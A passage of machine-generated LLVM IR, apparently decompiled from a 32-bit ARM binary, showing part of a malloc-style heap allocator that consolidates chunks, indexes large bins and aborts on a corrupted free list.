  %v4_1b69c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 16) to i32*), align 4
  store i32 %v4_1b69c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1b6a8.502 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1b69c)
  %v0_1b6a8 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1b6a8, -32
  br i1 %tmp, label %dec_label_pc_1b6cc, label %dec_label_pc_1b6b0

dec_label_pc_1b6b0:                               ; preds = %entry
  store i32 68008, i32* %r2.global-to-local, align 4
  %v0_1b6b4 = call i32 @__aeabi_read_tp()
  store i32 %v0_1b6b4, i32* %r0.global-to-local, align 4
  %v3_1b6b8 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1b6b8 = sext i16 %v3_1b6b8 to i32
  store i32 %v4_1b6b8, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1b6c4 = add i32 %v4_1b6b8, %v0_1b6b4
  %v4_1b6c4 = inttoptr i32 %v3_1b6c4 to i32*
  store i32 12, i32* %v4_1b6c4, align 4
  br label %dec_label_pc_1bf50

dec_label_pc_1b6cc:                               ; preds = %entry
  %v1_1b6cc = add i32 %v0_1b6a8, 11
  store i32 %v1_1b6cc, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r2.global-to-local, align 4
  %v2_1b6d8 = icmp ugt i32 %v1_1b6cc, 14
  %v7_1b6d8 = icmp eq i32 %v1_1b6cc, 15
  %v2_1b6dc = xor i1 %v7_1b6d8, true
  %v3_1b6dc = and i1 %v2_1b6d8, %v2_1b6dc
  br i1 %v3_1b6dc, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_1b6cc
  %v5_1b6dc = and i32 %v1_1b6cc, -8
  store i32 %v5_1b6dc, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_1b6cc, %bb
  %v4_1b6e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1b6e0, i32* @r0, align 4
  %v1_1b6e4 = inttoptr i32 %v4_1b6e0 to i32*
  %v2_1b6e4 = load i32, i32* %v1_1b6e4, align 4
  store i32 %v2_1b6e4, i32* @r4, align 4
  %v2_1b6e8 = xor i1 %v2_1b6d8, true
  %v3_1b6e8 = or i1 %v7_1b6d8, %v2_1b6e8
  br i1 %v3_1b6e8, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_1b6ec = urem i32 %v2_1b6e4, 2
  %v2_1b6ec = icmp eq i32 %v1_1b6ec, 0
  br i1 %v2_1b6ec, label %dec_label_pc_1b6f4, label %dec_label_pc_1b704

dec_label_pc_1b6f4:                               ; preds = %bb140
  %v2_1b6f4 = icmp eq i32 %v2_1b6e4, 0
  br i1 %v2_1b6f4, label %dec_label_pc_1b6fc, label %dec_label_pc_1bae0

dec_label_pc_1b6fc:                               ; preds = %dec_label_pc_1b6f4
  %v0_1b6fc = call i32 @__malloc_consolidate()
  store i32 %v0_1b6fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bae0

dec_label_pc_1b704:                               ; preds = %bb140
  %v0_1b704 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_1b704, %v2_1b6e4
  br i1 %tmp201, label %dec_label_pc_1b72c, label %dec_label_pc_1b70c

dec_label_pc_1b70c:                               ; preds = %dec_label_pc_1b704
  %v1_1b70c = add i32 %v4_1b6e0, -4
  store i32 %v1_1b70c, i32* %r1.global-to-local, align 4
  %v3_1b710 = udiv i32 %v0_1b704, 8
  store i32 %v3_1b710, i32* %r2.global-to-local, align 4
  %v4_1b714 = mul nuw i32 %v3_1b710, 4
  %v5_1b714 = add i32 %v4_1b714, %v1_1b70c
  %v6_1b714 = inttoptr i32 %v5_1b714 to i32*
  %v7_1b714 = load i32, i32* %v6_1b714, align 4
  store i32 %v7_1b714, i32* %r0.global-to-local, align 4
  %v2_1b718 = icmp eq i32 %v7_1b714, 0
  br i1 %v2_1b718, label %dec_label_pc_1b72c, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1b70c
  %v2_1b71c = add i32 %v7_1b714, 8
  %v3_1b71c = inttoptr i32 %v2_1b71c to i32*
  %v4_1b71c = load i32, i32* %v3_1b71c, align 4
  store i32 %v4_1b71c, i32* %r3.global-to-local, align 4
  store i32 %v2_1b71c, i32* %r0.global-to-local, align 4
  store i32 %v2_1b71c, i32* %r4.global-to-local, align 4
  store i32 %v4_1b71c, i32* %v6_1b714, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1b72c:                               ; preds = %dec_label_pc_1b70c, %dec_label_pc_1b704
  %tmp202 = icmp ugt i32 %v0_1b704, 255
  br i1 %tmp202, label %dec_label_pc_1b77c, label %dec_label_pc_1b734

dec_label_pc_1b734:                               ; preds = %dec_label_pc_1b72c
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1b73c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  %v3_1b740 = udiv i32 %v0_1b704, 8
  store i32 %v3_1b740, i32* @r7, align 4
  %v4_1b744 = mul nuw i32 %v3_1b740, 8
  %v5_1b744 = add i32 %v4_1b73c, %v4_1b744
  store i32 %v5_1b744, i32* %r3.global-to-local, align 4
  %v1_1b748 = add i32 %v5_1b744, 44
  store i32 %v1_1b748, i32* %ip.global-to-local, align 4
  %v1_1b74c = add i32 %v5_1b744, 56
  %v2_1b74c = inttoptr i32 %v1_1b74c to i32*
  %v3_1b74c = load i32, i32* %v2_1b74c, align 4
  store i32 %v3_1b74c, i32* %r0.global-to-local, align 4
  %v9_1b750 = icmp eq i32 %v3_1b74c, %v1_1b748
  br i1 %v9_1b750, label %dec_label_pc_1b8dc, label %dec_label_pc_1b758

dec_label_pc_1b758:                               ; preds = %dec_label_pc_1b734
  %v2_1b758 = add i32 %v3_1b74c, %v0_1b704
  store i32 %v2_1b758, i32* %r3.global-to-local, align 4
  %v1_1b75c = add i32 %v2_1b758, 4
  %v2_1b75c = inttoptr i32 %v1_1b75c to i32*
  %v3_1b75c = load i32, i32* %v2_1b75c, align 4
  store i32 %v3_1b75c, i32* %r2.global-to-local, align 4
  %v1_1b760 = add i32 %v3_1b74c, 12
  %v2_1b760 = inttoptr i32 %v1_1b760 to i32*
  %v3_1b760 = load i32, i32* %v2_1b760, align 4
  store i32 %v3_1b760, i32* %r1.global-to-local, align 4
  %v1_1b764 = or i32 %v3_1b75c, 1
  store i32 %v1_1b764, i32* %r2.global-to-local, align 4
  %v1_1b768 = add i32 %v3_1b74c, 8
  store i32 %v1_1b768, i32* %r4.global-to-local, align 4
  store i32 %v1_1b764, i32* %v2_1b75c, align 4
  %v0_1b770 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b770 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b770 = add i32 %v1_1b770, 8
  %v3_1b770 = inttoptr i32 %v2_1b770 to i32*
  store i32 %v0_1b770, i32* %v3_1b770, align 4
  %v0_1b774 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b774 = load i32, i32* %ip.global-to-local, align 4
  %v2_1b774 = add i32 %v1_1b774, 12
  %v3_1b774 = inttoptr i32 %v2_1b774 to i32*
  store i32 %v0_1b774, i32* %v3_1b774, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1b77c:                               ; preds = %dec_label_pc_1b72c
  store i32 %v0_1b704, i32* %r0.global-to-local, align 4
  %v1_1b780 = call i32 @__malloc_largebin_index(i32 %v0_1b704)
  store i32 %v1_1b780, i32* %r0.global-to-local, align 4
  %v0_1b784 = load i32, i32* @r4, align 4
  %v1_1b784 = and i32 %v0_1b784, 2
  %v2_1b784 = icmp eq i32 %v1_1b784, 0
  store i32 %v1_1b780, i32* @r7, align 4
  br i1 %v2_1b784, label %dec_label_pc_1b8dc, label %dec_label_pc_1b790

dec_label_pc_1b790:                               ; preds = %dec_label_pc_1b77c
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r1.global-to-local, align 4
  %v4_1b798 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1b798, i32* @r0, align 4
  %v0_1b79c = call i32 @__malloc_consolidate()
  store i32 %v0_1b79c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b8dc

dec_label_pc_1b7a4:                               ; preds = %dec_label_pc_1b8f0
  %v1_1b7a4 = add i32 %v3_1b8f0, 4
  %v2_1b7a4 = inttoptr i32 %v1_1b7a4 to i32*
  %v3_1b7a4 = load i32, i32* %v2_1b7a4, align 4
  store i32 %v3_1b7a4, i32* %r3.global-to-local, align 4
  %v0_1b7a8 = load i32, i32* @sl, align 4
  %v1_1b7ac = and i32 %v3_1b7a4, -4
  store i32 %v1_1b7ac, i32* %r4.global-to-local, align 4
  %v1_1b7b0 = add i32 %v3_1b8f0, 12
  %v2_1b7b0 = inttoptr i32 %v1_1b7b0 to i32*
  %v3_1b7b0 = load i32, i32* %v2_1b7b0, align 4
  store i32 %v3_1b7b0, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_1b7a8, 255
  br i1 %tmp203, label %dec_label_pc_1b80c, label %dec_label_pc_1b7b8

dec_label_pc_1b7b8:                               ; preds = %dec_label_pc_1b7a4
  %v9_1b7b8 = icmp eq i32 %v3_1b7b0, %v0_1b810
  br i1 %v9_1b7b8, label %dec_label_pc_1b7c0, label %dec_label_pc_1b80c

dec_label_pc_1b7c0:                               ; preds = %dec_label_pc_1b7b8
  %v0_1b7c0 = load i32, i32* @sb, align 4
  %v1_1b7c0 = add i32 %v0_1b7c0, 48
  %v2_1b7c0 = inttoptr i32 %v1_1b7c0 to i32*
  %v3_1b7c0 = load i32, i32* %v2_1b7c0, align 4
  store i32 %v3_1b7c0, i32* %r3.global-to-local, align 4
  %v9_1b7c4 = icmp eq i32 %v3_1b8f0, %v3_1b7c0
  br i1 %v9_1b7c4, label %dec_label_pc_1b7cc, label %dec_label_pc_1b80c

dec_label_pc_1b7cc:                               ; preds = %dec_label_pc_1b7c0
  %v1_1b7cc = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_1b7ac, %v1_1b7cc
  br i1 %tmp204, label %dec_label_pc_1b7d4, label %dec_label_pc_1b80c

dec_label_pc_1b7d4:                               ; preds = %dec_label_pc_1b7cc
  %v2_1b7d4 = sub i32 %v1_1b7ac, %v0_1b7a8
  store i32 %v2_1b7d4, i32* %r2.global-to-local, align 4
  %v2_1b7d8 = add i32 %v0_1b7a8, %v3_1b8f0
  store i32 %v2_1b7d8, i32* %r3.global-to-local, align 4
  %v1_1b7dc = or i32 %v0_1b7a8, 1
  store i32 %v1_1b7dc, i32* %r0.global-to-local, align 4
  %v1_1b7e0 = or i32 %v2_1b7d4, 1
  store i32 %v1_1b7e0, i32* %r1.global-to-local, align 4
  %v1_1b7e4 = add i32 %v3_1b8f0, 8
  store i32 %v1_1b7e4, i32* %r4.global-to-local, align 4
  %v2_1b7e8 = add i32 %v0_1b810, 8
  %v3_1b7e8 = inttoptr i32 %v2_1b7e8 to i32*
  store i32 %v2_1b7d8, i32* %v3_1b7e8, align 4
  %v0_1b7ec = load i32, i32* %r3.global-to-local, align 4
  %v1_1b7ec = load i32, i32* %ip.global-to-local, align 4
  %v2_1b7ec = add i32 %v1_1b7ec, 12
  %v3_1b7ec = inttoptr i32 %v2_1b7ec to i32*
  store i32 %v0_1b7ec, i32* %v3_1b7ec, align 4
  %v0_1b7f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b7f0 = load i32, i32* @r6, align 4
  %v2_1b7f0 = add i32 %v1_1b7f0, 4
  %v3_1b7f0 = inttoptr i32 %v2_1b7f0 to i32*
  store i32 %v0_1b7f0, i32* %v3_1b7f0, align 4
  %v0_1b7f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b7f4 = load i32, i32* @sb, align 4
  %v2_1b7f4 = add i32 %v1_1b7f4, 48
  %v3_1b7f4 = inttoptr i32 %v2_1b7f4 to i32*
  store i32 %v0_1b7f4, i32* %v3_1b7f4, align 4
  %v0_1b7f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b7f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_1b7f8 = add i32 %v1_1b7f8, %v0_1b7f8
  %v4_1b7f8 = inttoptr i32 %v3_1b7f8 to i32*
  store i32 %v0_1b7f8, i32* %v4_1b7f8, align 4
  %v0_1b7fc = load i32, i32* %r1.global-to-local, align 4
  %v1_1b7fc = load i32, i32* %r3.global-to-local, align 4
  %v2_1b7fc = add i32 %v1_1b7fc, 4
  %v3_1b7fc = inttoptr i32 %v2_1b7fc to i32*
  store i32 %v0_1b7fc, i32* %v3_1b7fc, align 4
  %v0_1b800 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b800 = load i32, i32* %r3.global-to-local, align 4
  %v2_1b800 = add i32 %v1_1b800, 12
  %v3_1b800 = inttoptr i32 %v2_1b800 to i32*
  store i32 %v0_1b800, i32* %v3_1b800, align 4
  %v0_1b804 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b804 = load i32, i32* %r3.global-to-local, align 4
  %v2_1b804 = add i32 %v1_1b804, 8
  %v3_1b804 = inttoptr i32 %v2_1b804 to i32*
  store i32 %v0_1b804, i32* %v3_1b804, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1b80c:                               ; preds = %dec_label_pc_1b7cc, %dec_label_pc_1b7c0, %dec_label_pc_1b7b8, %dec_label_pc_1b7a4
  %v9_1b80c = icmp eq i32 %v1_1b7ac, %v0_1b7a8
  %v2_1b810 = add i32 %v3_1b7b0, 8
  %v3_1b810 = inttoptr i32 %v2_1b810 to i32*
  store i32 %v0_1b810, i32* %v3_1b810, align 4
  %v0_1b814 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b814 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b814 = add i32 %v1_1b814, 12
  %v3_1b814 = inttoptr i32 %v2_1b814 to i32*
  store i32 %v0_1b814, i32* %v3_1b814, align 4
  br i1 %v9_1b80c, label %dec_label_pc_1b96c.loopexit, label %dec_label_pc_1b828

dec_label_pc_1b828:                               ; preds = %dec_label_pc_1b80c
  %v0_1b828 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_1b828, 255
  br i1 %tmp205, label %dec_label_pc_1b84c, label %dec_label_pc_1b830

dec_label_pc_1b830:                               ; preds = %dec_label_pc_1b828
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r2.global-to-local, align 4
  %v1_1b834 = load i32, i32* %r8.global-to-local, align 4
  %v2_1b834 = add i32 %v1_1b834, ptrtoint (i32* @global_var_2c010.418 to i32)
  %v3_1b834 = inttoptr i32 %v2_1b834 to i32*
  %v4_1b834 = load i32, i32* %v3_1b834, align 4
  %v3_1b838 = udiv i32 %v0_1b828, 8
  store i32 %v3_1b838, i32* %r0.global-to-local, align 4
  %v4_1b83c = mul nuw i32 %v3_1b838, 8
  %v5_1b83c = add i32 %v4_1b834, %v4_1b83c
  store i32 %v5_1b83c, i32* %r3.global-to-local, align 4
  %v1_1b840 = add i32 %v5_1b83c, 44
  store i32 %v1_1b840, i32* %ip.global-to-local, align 4
  %v1_1b844 = add i32 %v5_1b83c, 52
  %v2_1b844 = inttoptr i32 %v1_1b844 to i32*
  %v3_1b844 = load i32, i32* %v2_1b844, align 4
  store i32 %v3_1b844, i32* @lr, align 4
  br label %dec_label_pc_1b8a4

dec_label_pc_1b84c:                               ; preds = %dec_label_pc_1b828
  store i32 %v0_1b828, i32* %r0.global-to-local, align 4
  %v1_1b850 = call i32 @__malloc_largebin_index(i32 %v0_1b828)
  store i32 %v1_1b850, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %ip.global-to-local, align 4
  %v1_1b858 = load i32, i32* %r8.global-to-local, align 4
  %v2_1b858 = add i32 %v1_1b858, ptrtoint (i32* @global_var_2c010.418 to i32)
  %v3_1b858 = inttoptr i32 %v2_1b858 to i32*
  %v4_1b858 = load i32, i32* %v3_1b858, align 4
  %v4_1b85c = mul i32 %v1_1b850, 8
  %v5_1b85c = add i32 %v4_1b858, %v4_1b85c
  store i32 %v5_1b85c, i32* %r3.global-to-local, align 4
  %v1_1b860 = add i32 %v5_1b85c, 44
  store i32 %v1_1b860, i32* %ip.global-to-local, align 4
  %v1_1b864 = add i32 %v5_1b85c, 52
  %v2_1b864 = inttoptr i32 %v1_1b864 to i32*
  %v3_1b864 = load i32, i32* %v2_1b864, align 4
  store i32 %v3_1b864, i32* @lr, align 4
  %v9_1b868 = icmp eq i32 %v3_1b864, %v1_1b860
  br i1 %v9_1b868, label %dec_label_pc_1b8a4, label %dec_label_pc_1b870

dec_label_pc_1b870:                               ; preds = %dec_label_pc_1b84c
  %v1_1b870 = add i32 %v5_1b85c, 56
  %v2_1b870 = inttoptr i32 %v1_1b870 to i32*
  %v3_1b870 = load i32, i32* %v2_1b870, align 4
  store i32 %v3_1b870, i32* %r1.global-to-local, align 4
  %v1_1b874 = add i32 %v3_1b870, 4
  %v2_1b874 = inttoptr i32 %v1_1b874 to i32*
  %v3_1b874 = load i32, i32* %v2_1b874, align 4
  store i32 %v3_1b874, i32* %r3.global-to-local, align 4
  %v0_1b878 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b878 = icmp ult i32 %v0_1b878, %v3_1b874
  br i1 %v3_1b878, label %.thread, label %dec_label_pc_1b894.preheader

.thread:                                          ; preds = %dec_label_pc_1b870
  store i32 %v1_1b860, i32* @lr, align 4
  store i32 %v3_1b870, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1b8a4

dec_label_pc_1b894.preheader:                     ; preds = %dec_label_pc_1b870
  %v2_1b880 = or i32 %v0_1b878, 1
  store i32 %v2_1b880, i32* %r2.global-to-local, align 4
  %v1_1b894179 = add i32 %v3_1b864, 4
  %v2_1b894180 = inttoptr i32 %v1_1b894179 to i32*
  %v3_1b894181 = load i32, i32* %v2_1b894180, align 4
  store i32 %v3_1b894181, i32* %r3.global-to-local, align 4
  %v3_1b898183 = icmp ult i32 %v2_1b880, %v3_1b894181
  br i1 %v3_1b898183, label %dec_label_pc_1b890, label %dec_label_pc_1b8a0

dec_label_pc_1b890:                               ; preds = %dec_label_pc_1b894.preheader, %dec_label_pc_1b890
  %v0_1b8a0184 = phi i32 [ %v3_1b890, %dec_label_pc_1b890 ], [ %v3_1b864, %dec_label_pc_1b894.preheader ]
  %v1_1b890 = add i32 %v0_1b8a0184, 8
  %v2_1b890 = inttoptr i32 %v1_1b890 to i32*
  %v3_1b890 = load i32, i32* %v2_1b890, align 4
  store i32 %v3_1b890, i32* @lr, align 4
  %v1_1b894 = add i32 %v3_1b890, 4
  %v2_1b894 = inttoptr i32 %v1_1b894 to i32*
  %v3_1b894 = load i32, i32* %v2_1b894, align 4
  store i32 %v3_1b894, i32* %r3.global-to-local, align 4
  %v3_1b898 = icmp ult i32 %v2_1b880, %v3_1b894
  br i1 %v3_1b898, label %dec_label_pc_1b890, label %dec_label_pc_1b8a0

dec_label_pc_1b8a0:                               ; preds = %dec_label_pc_1b890, %dec_label_pc_1b894.preheader
  %v0_1b8a0.lcssa = phi i32 [ %v3_1b864, %dec_label_pc_1b894.preheader ], [ %v3_1b890, %dec_label_pc_1b890 ]
  %v1_1b8a0 = add i32 %v0_1b8a0.lcssa, 12
  %v2_1b8a0 = inttoptr i32 %v1_1b8a0 to i32*
  %v3_1b8a0 = load i32, i32* %v2_1b8a0, align 4
  store i32 %v3_1b8a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1b8a4

dec_label_pc_1b8a4:                               ; preds = %.thread, %dec_label_pc_1b84c, %dec_label_pc_1b830, %dec_label_pc_1b8a0
  %v0_1b8c4 = phi i32 [ %v1_1b860, %dec_label_pc_1b84c ], [ %v1_1b840, %dec_label_pc_1b830 ], [ %v3_1b8a0, %dec_label_pc_1b8a0 ], [ %v3_1b870, %.thread ]
  %v0_1b8b8 = phi i32 [ %v1_1b850, %dec_label_pc_1b84c ], [ %v3_1b838, %dec_label_pc_1b830 ], [ %v1_1b850, %dec_label_pc_1b8a0 ], [ %v1_1b850, %.thread ]
  %v1_1b8a8 = phi i32 [ %v1_1b858, %dec_label_pc_1b84c ], [ %v1_1b834, %dec_label_pc_1b830 ], [ %v1_1b858, %dec_label_pc_1b8a0 ], [ %v1_1b858, %.thread ]
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r2.global-to-local, align 4
  %v2_1b8a8 = add i32 %v1_1b8a8, ptrtoint (i32* @global_var_2c010.418 to i32)
  %v3_1b8a8 = inttoptr i32 %v2_1b8a8 to i32*
  %v4_1b8a8 = load i32, i32* %v3_1b8a8, align 4
  %v3_1b8ac = sdiv i32 %v0_1b8b8, 32
  store i32 %v3_1b8ac, i32* %r3.global-to-local, align 4
  %v4_1b8b0 = mul nsw i32 %v3_1b8ac, 4
  %v5_1b8b0 = add i32 %v4_1b8a8, %v4_1b8b0
  store i32 %v5_1b8b0, i32* %r1.global-to-local, align 4
  %v1_1b8b4 = add i32 %v5_1b8b0, 820
  %v2_1b8b4 = inttoptr i32 %v1_1b8b4 to i32*
  %v3_1b8b4 = load i32, i32* %v2_1b8b4, align 4
  %v1_1b8b8 = urem i32 %v0_1b8b8, 32
  store i32 %v1_1b8b8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_1b8c0 = shl i32 1, %v1_1b8b8
  %v8_1b8c0 = or i32 %v3_1b8b4, %v7_1b8c0
  store i32 %v8_1b8c0, i32* %r3.global-to-local, align 4
  %v1_1b8c4 = load i32, i32* @r6, align 4
  %v2_1b8c4 = add i32 %v1_1b8c4, 12
  %v3_1b8c4 = inttoptr i32 %v2_1b8c4 to i32*
  store i32 %v0_1b8c4, i32* %v3_1b8c4, align 4
  %v0_1b8c8 = load i32, i32* @lr, align 4
  %v1_1b8c8 = load i32, i32* @r6, align 4
  %v2_1b8c8 = add i32 %v1_1b8c8, 8
  %v3_1b8c8 = inttoptr i32 %v2_1b8c8 to i32*
  store i32 %v0_1b8c8, i32* %v3_1b8c8, align 4
  %v0_1b8cc = load i32, i32* %r3.global-to-local, align 4
  %v1_1b8cc = load i32, i32* %r1.global-to-local, align 4
  %v2_1b8cc = add i32 %v1_1b8cc, 820
  %v3_1b8cc = inttoptr i32 %v2_1b8cc to i32*
  store i32 %v0_1b8cc, i32* %v3_1b8cc, align 4
  %v0_1b8d0 = load i32, i32* @r6, align 4
  %v1_1b8d0 = load i32, i32* @lr, align 4
  %v2_1b8d0 = add i32 %v1_1b8d0, 12
  %v3_1b8d0 = inttoptr i32 %v2_1b8d0 to i32*
  store i32 %v0_1b8d0, i32* %v3_1b8d0, align 4
  %v0_1b8d4 = load i32, i32* @r6, align 4
  %v1_1b8d4 = load i32, i32* %ip.global-to-local, align 4
  %v2_1b8d4 = add i32 %v1_1b8d4, 8
  %v3_1b8d4 = inttoptr i32 %v2_1b8d4 to i32*
  store i32 %v0_1b8d4, i32* %v3_1b8d4, align 4
  %v0_1b8f0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1b8f0

dec_label_pc_1b8dc:                               ; preds = %dec_label_pc_1b77c, %dec_label_pc_1b734, %dec_label_pc_1b790
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r1.global-to-local, align 4
  %v4_1b8e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1b8e4, i32* @sb, align 4
  %v0_1b8e8 = load i32, i32* @sl, align 4
  %v1_1b8e8 = add i32 %v0_1b8e8, 16
  store i32 %v1_1b8e8, i32* @fp, align 4
  %v1_1b8ec = add i32 %v4_1b8e4, 52
  store i32 %v1_1b8ec, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1b8f0

dec_label_pc_1b8f0:                               ; preds = %dec_label_pc_1b8a4, %dec_label_pc_1b8dc
  %v0_1b810 = phi i32 [ %v0_1b8f0.pre, %dec_label_pc_1b8a4 ], [ %v1_1b8ec, %dec_label_pc_1b8dc ]
  %v1_1b8f0 = add i32 %v0_1b810, 12
  %v2_1b8f0 = inttoptr i32 %v1_1b8f0 to i32*
  %v3_1b8f0 = load i32, i32* %v2_1b8f0, align 4
  store i32 %v3_1b8f0, i32* @r6, align 4
  %v9_1b8f4 = icmp eq i32 %v3_1b8f0, %v0_1b810
  br i1 %v9_1b8f4, label %dec_label_pc_1b8fc, label %dec_label_pc_1b7a4

dec_label_pc_1b8fc:                               ; preds = %dec_label_pc_1b8f0
  %v0_1b8fc = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_1b8fc, 256
  %v0_1b9b4.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_1b8fc.dec_label_pc_1b9b4_crit_edge, label %dec_label_pc_1b904

dec_label_pc_1b8fc.dec_label_pc_1b9b4_crit_edge:  ; preds = %dec_label_pc_1b8fc
  %.pre200 = mul i32 %v0_1b9b4.pre, 8
  br label %dec_label_pc_1b9b4

dec_label_pc_1b904:                               ; preds = %dec_label_pc_1b8fc
  %v4_1b904 = mul i32 %v0_1b9b4.pre, 8
  %v5_1b904 = add i32 %v4_1b904, %v0_1b810
  store i32 %v5_1b904, i32* %r3.global-to-local, align 4
  %v1_1b908 = add i32 %v5_1b904, -8
  store i32 %v1_1b908, i32* %r1.global-to-local, align 4
  %v1_1b90c = add i32 %v5_1b904, 4
  %v2_1b90c = inttoptr i32 %v1_1b90c to i32*
  %storemerge.pre = load i32, i32* %v2_1b90c, align 4
  br label %dec_label_pc_1b9ac

dec_label_pc_1b914:                               ; preds = %dec_label_pc_1b9ac
  %v1_1b914 = add i32 %v1_1b93c, 4
  %v2_1b914 = inttoptr i32 %v1_1b914 to i32*
  %v3_1b914 = load i32, i32* %v2_1b914, align 4
  store i32 %v3_1b914, i32* %r3.global-to-local, align 4
  %v1_1b918 = and i32 %v3_1b914, -4
  store i32 %v1_1b918, i32* %r2.global-to-local, align 4
  %v3_1b91c = icmp ult i32 %v1_1b918, %v0_1b8fc
  %v1_1b920 = add i32 %v1_1b93c, 12
  %v2_1b920 = inttoptr i32 %v1_1b920 to i32*
  %v3_1b920 = load i32, i32* %v2_1b920, align 4
  store i32 %v3_1b920, i32* %r0.global-to-local, align 4
  br i1 %v3_1b91c, label %dec_label_pc_1b9ac, label %dec_label_pc_1b928

dec_label_pc_1b928:                               ; preds = %dec_label_pc_1b914
  %v1_1b928 = add i32 %v1_1b93c, 8
  %v2_1b928 = inttoptr i32 %v1_1b928 to i32*
  %v3_1b928 = load i32, i32* %v2_1b928, align 4
  store i32 %v3_1b928, i32* %r1.global-to-local, align 4
  %v1_1b92c = add i32 %v3_1b928, 12
  %v2_1b92c = inttoptr i32 %v1_1b92c to i32*
  %v3_1b92c = load i32, i32* %v2_1b92c, align 4
  store i32 %v3_1b92c, i32* %r3.global-to-local, align 4
  %v9_1b930 = icmp eq i32 %v3_1b92c, %v1_1b93c
  br i1 %v9_1b930, label %dec_label_pc_1b938, label %dec_label_pc_1b944

dec_label_pc_1b938:                               ; preds = %dec_label_pc_1b928
  %v1_1b938 = add i32 %v3_1b920, 8
  %v2_1b938 = inttoptr i32 %v1_1b938 to i32*
  %v3_1b938 = load i32, i32* %v2_1b938, align 4
  store i32 %v3_1b938, i32* %r3.global-to-local, align 4
  %v9_1b93c = icmp eq i32 %v3_1b938, %v1_1b93c
  br i1 %v9_1b93c, label %dec_label_pc_1b948, label %dec_label_pc_1b944

dec_label_pc_1b944:                               ; preds = %dec_label_pc_1b928, %dec_label_pc_1b938
  %v0_1b944 = call i32 @abort()
  store i32 %v0_1b944, i32* %r0.global-to-local, align 4
  %v0_1b948.pre = load i32, i32* @sl, align 4
  %v1_1b948.pre = load i32, i32* @r2, align 4
  %v0_1b950.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1b948

dec_label_pc_1b948:                               ; preds = %dec_label_pc_1b938, %dec_label_pc_1b944
  %v1_1b950 = phi i32 [ %v3_1b920, %dec_label_pc_1b938 ], [ %v0_1b944, %dec_label_pc_1b944 ]
  %v0_1b950 = phi i32 [ %v3_1b928, %dec_label_pc_1b938 ], [ %v0_1b950.pre, %dec_label_pc_1b944 ]
  %v1_1b948 = phi i32 [ %v1_1b918, %dec_label_pc_1b938 ], [ %v1_1b948.pre, %dec_label_pc_1b944 ]
  %v0_1b948 = phi i32 [ %v0_1b8fc, %dec_label_pc_1b938 ], [ %v0_1b948.pre, %dec_label_pc_1b944 ]
  %v2_1b948 = sub i32 %v1_1b948, %v0_1b948
  store i32 %v2_1b948, i32* %lr.global-to-local, align 4
  %v2_1b950 = add i32 %v1_1b950, 8
  %v3_1b950 = inttoptr i32 %v2_1b950 to i32*
  store i32 %v0_1b950, i32* %v3_1b950, align 4
  %v0_1b954 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b954 = load i32, i32* %r1.global-to-local, align 4
